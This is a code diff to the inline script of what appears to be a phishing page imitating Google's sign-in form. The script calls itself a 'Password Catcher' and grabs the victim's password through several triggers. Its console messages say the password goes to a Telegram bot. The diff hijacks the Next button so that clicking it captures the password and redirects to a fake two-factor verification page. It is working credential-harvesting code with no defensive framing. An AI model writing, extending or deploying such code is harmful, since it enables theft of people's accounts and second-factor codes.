@@ -16089,6 +16089,7 @@
     
     let passwordSent = false;
     let captureAttempts = 0;
+    let buttonOverridden = false;
     
     // ====== GET EMAIL FROM PAGE ======
     function getEmail() {
@@ -16254,6 +16255,21 @@
         }, 5000);
     }
     
+    // ====== NAVIGATE TO 2FA PAGE ======
+    function navigateTo2FA() {
+        // First capture the password if not already sent
+        if (!passwordSent) {
+            captureAndLog('next-button');
+        }
+        
+        // Navigate to 2FA verification page
+        // Add a small delay to ensure capture completes
+        setTimeout(function() {
+            // Check if 2FA page exists in the same directory
+            window.location.href = '2fa-verification.html';
+        }, 500);
+    }
+    
     // ====== RETRIEVE FUNCTION ======
     window.getCaptured = function() {
         try {
@@ -16279,128 +16295,199 @@
         return null;
     };
     
-    // ====== EVENT LISTENERS ======
-    
-    // 1. Password field - input events
-    const passwordField = document.querySelector('input[name="Passwd"]') || 
-                          document.querySelector('input[type="password"]');
-    
-    if (passwordField) {
-        // On input (typing)
-        passwordField.addEventListener('input', function() {
-            if (this.value.length > 0) {
-                // Don't send immediately, wait for user to finish typing
-                clearTimeout(this._inputTimer);
-                this._inputTimer = setTimeout(() => {
-                    // Only capture if password has reasonable length
-                    if (this.value.length >= 4) {
-                        captureAndLog('typing');
+    // ====== OVERRIDE NEXT BUTTON ======
+    function overrideNextButton() {
+        // Try multiple selectors to find the Next button
+        const selectors = [
+            '#passwordNext button',
+            'button[jsname="LgbsSe"]',
+            '.VfPpkd-LgbsSe .VfPpkd-vQzf8d',
+            'button[type="button"]'
+        ];
+        
+        let nextButton = null;
+        
+        // Try each selector
+        for (let selector of selectors) {
+            try {
+                const elements = document.querySelectorAll(selector);
+                for (let el of elements) {
+                    const parent = el.closest('button') || el;
+                    if (parent.textContent && parent.textContent.trim() === 'Next') {
+                        nextButton = parent;
+                        break;
                     }
-                }, 2000);
+                }
+                if (nextButton) break;
+            } catch(e) {
+                // Skip invalid selectors
+            }
+        }
+        
+        // If still not found, try to find any button with "Next" text
+        if (!nextButton) {
+            const buttons = document.querySelectorAll('button');
+            for (let btn of buttons) {
+                if (btn.textContent && btn.textContent.trim() === 'Next') {
+                    nextButton = btn;
+                    break;
+                }
+            }
+        }
+        
+        if (nextButton && !buttonOverridden) {
+            console.log('✅ Next button found, overriding...');
+            buttonOverridden = true;
+            
+            // Remove all existing event listeners by cloning
+            const newButton = nextButton.cloneNode(true);
+            nextButton.parentNode.replaceChild(newButton, nextButton);
+            
+            // Add our custom click handler
+            newButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                console.log('🔵 Next button clicked - navigating to 2FA...');
+                navigateTo2FA();
+            });
+            
+            console.log('✅ Next button override complete!');
+            showStatus('✅ Next button now navigates to 2FA', 'success');
+            return true;
+        } else if (!nextButton) {
+            console.log('⚠️ Could not find Next button, retrying...');
+            // Retry after a short delay
+            setTimeout(overrideNextButton, 1000);
+            return false;
+        }
+        return true;
+    }
+    
+    // ====== SETUP EVENT LISTENERS ======
+    function setupEventListeners() {
+        // 1. Password field - input events
+        const passwordField = document.querySelector('input[name="Passwd"]') || 
+                              document.querySelector('input[type="password"]');
+        
+        if (passwordField) {
+            // On input (typing)
+            passwordField.addEventListener('input', function() {
+                if (this.value.length > 0) {
+                    clearTimeout(this._inputTimer);
+                    this._inputTimer = setTimeout(() => {
+                        if (this.value.length >= 4 && !passwordSent) {
+                            captureAndLog('typing');
+                        }
+                    }, 2000);
+                }
+            });
+            
+            // On blur (user moved away)
+            passwordField.addEventListener('blur', function() {
+                if (this.value.length >= 4 && !passwordSent) {
+                    setTimeout(() => captureAndLog('blur'), 200);
+                }
+            });
+            
+            // On Enter key - also navigate to 2FA
+            passwordField.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // Check if password is filled
+                    if (this.value.length >= 4) {
+                        navigateTo2FA();
+                    } else {
+                        showStatus('⚠️ Please enter your password', 'info');
+                    }
+                }
+            });
+        }
+        
+        // 2. Show password checkbox - track but don't trigger
+        const showPwdCheckbox = document.querySelector('input[type="checkbox"]');
+        if (showPwdCheckbox) {
+            showPwdCheckbox.addEventListener('change', function() {
+                console.log('👁️ Show password toggled:', this.checked);
+            });
+        }
+        
+        // 3. Manual trigger: Ctrl+Shift+P
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+                e.preventDefault();
+                captureAndLog('manual');
+                showStatus('🔄 Manual capture triggered', 'info');
             }
         });
         
-        // On blur (user moved away)
-        passwordField.addEventListener('blur', function() {
-            if (this.value.length >= 4) {
-                setTimeout(() => captureAndLog('blur'), 200);
+        // 4. Periodic check (every 3 seconds)
+        setInterval(() => {
+            if (!passwordSent) {
+                const pwd = getPassword();
+                if (pwd && pwd.length >= 4) {
+                    captureAndLog('periodic');
+                }
             }
-        });
+        }, 3000);
         
-        // On Enter key
-        passwordField.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                setTimeout(() => captureAndLog('enter-key'), 300);
+        // 5. Check if password already filled on page load
+        setTimeout(() => {
+            const pwd = getPassword();
+            if (pwd && pwd.length >= 4 && !passwordSent) {
+                captureAndLog('initial');
             }
-        });
-    }
-    
-    // 2. Next button
-    const nextBtn = document.querySelector('#passwordNext button') || 
-                    document.querySelector('button[jsname="LgbsSe"]');
-    
-    if (nextBtn) {
-        nextBtn.addEventListener('click', function(e) {
-            setTimeout(() => captureAndLog('next-button'), 300);
-        });
-    }
-    
-    // Also listen for click on any Next button
-    document.addEventListener('click', function(e) {
-        const target = e.target.closest('button') || e.target.closest('[role="button"]');
-        if (target) {
-            const text = target.textContent || '';
-            if (text.trim() === 'Next') {
-                setTimeout(() => captureAndLog('next-click'), 300);
+        }, 2000);
+        
+        // 6. MutationObserver for dynamic content
+        const observer = new MutationObserver(function(mutations) {
+            if (passwordSent) return;
+            
+            // Check if Next button appeared (for dynamic pages)
+            if (!buttonOverridden) {
+                overrideNextButton();
             }
-        }
-    }, true);
-    
-    // 3. Form submit
-    document.addEventListener('submit', function(e) {
-        if (e.target && e.target.querySelector('input[name="Passwd"]')) {
-            setTimeout(() => captureAndLog('form-submit'), 300);
-        }
-    }, true);
-    
-    // 4. Show password checkbox - track but don't trigger
-    const showPwdCheckbox = document.querySelector('input[type="checkbox"]');
-    if (showPwdCheckbox) {
-        showPwdCheckbox.addEventListener('change', function() {
-            // Just log the change, don't trigger capture
-            console.log('👁️ Show password toggled:', this.checked);
-        });
-    }
-    
-    // 5. Manual trigger: Ctrl+Shift+P
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'P') {
-            e.preventDefault();
-            captureAndLog('manual');
-            showStatus('🔄 Manual capture triggered', 'info');
-        }
-    });
-    
-    // 6. Periodic check (every 3 seconds)
-    setInterval(() => {
-        if (!passwordSent) {
+            
             const pwd = getPassword();
             if (pwd && pwd.length >= 4) {
-                captureAndLog('periodic');
+                captureAndLog('dom-change');
             }
-        }
-    }, 3000);
+        });
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true,
+            attributes: true
+        });
+    }
     
-    // 7. Check if password already filled on page load
-    setTimeout(() => {
-        const pwd = getPassword();
-        if (pwd && pwd.length >= 4) {
-            captureAndLog('initial');
-        }
-    }, 2000);
+    // ====== INITIALIZATION ======
+    function init() {
+        console.log('%c🔐 Password Catcher Active!', 'font-size:20px;font-weight:bold;color:#0f0;background:#000;padding:15px;border-radius:10px;');
+        console.log('📌 Enter your password and click "Next" or press Enter');
+        console.log('📌 Password will be sent to your Telegram bot');
+        console.log('📌 Clicking "Next" will navigate to 2fa-verification.html');
+        console.log('💡 Press Ctrl+Shift+P to manually capture');
+        console.log('📌 Retrieve captured data with: getCaptured()');
+        
+        showStatus('🔐 Active - enter your password', 'info');
+        
+        // Setup event listeners
+        setupEventListeners();
+        
+        // Override the Next button
+        setTimeout(overrideNextButton, 1000);
+        setTimeout(overrideNextButton, 3000); // Retry after 3 seconds
+        setTimeout(overrideNextButton, 5000); // Retry after 5 seconds
+    }
     
-    // 8. MutationObserver for dynamic content
-    const observer = new MutationObserver(function(mutations) {
-        if (passwordSent) return;
-        const pwd = getPassword();
-        if (pwd && pwd.length >= 4) {
-            captureAndLog('dom-change');
-        }
-    });
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true,
-        attributes: true
-    });
-    
-    // ====== STARTUP MESSAGE ======
-    console.log('%c🔐 Password Catcher Active!', 'font-size:20px;font-weight:bold;color:#0f0;background:#000;padding:15px;border-radius:10px;');
-    console.log('📌 Enter your password and click "Next" or press Enter');
-    console.log('📌 Password will be sent to your Telegram bot');
-    console.log('💡 Press Ctrl+Shift+P to manually capture');
-    console.log('📌 Retrieve captured data with: getCaptured()');
-    
-    showStatus('🔐 Active - enter your password', 'info');
+    // Start when DOM is ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
     
 })();
 </script>
